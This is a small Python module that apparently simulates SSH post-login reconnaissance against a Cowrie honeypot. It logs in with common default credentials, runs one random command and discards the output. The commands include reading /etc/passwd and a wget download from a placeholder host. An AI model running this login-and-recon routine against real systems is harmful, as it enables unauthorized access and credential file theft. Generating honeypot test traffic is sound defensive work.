"""SSH post-login recon against Cowrie: log in with a common credential, run one recon command, discard output."""
import paramiko

ATTACK_TYPE = "ssh_postlogin"
DEFAULT_RATE = 0.5

CREDS = [("root", "root"), ("admin", "admin"), ("ubuntu", "ubuntu"), ("user", "user")]
COMMANDS = ["uname -a", "whoami", "cat /etc/passwd", "ps aux", "wget http://example.com/x"]


def step(ctx):
    host, port = ctx.targets["ssh"]
    username, password = ctx.rng.choice(CREDS)
    command = ctx.rng.choice(COMMANDS)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=port, username=username, password=password,
                       timeout=ctx.timeout, allow_agent=False, look_for_keys=False,
                       banner_timeout=ctx.timeout)
        _, stdout, _ = client.exec_command(command, timeout=ctx.timeout)
        stdout.read()  # output is discarded; Cowrie logs the command itself
    finally:
        client.close()
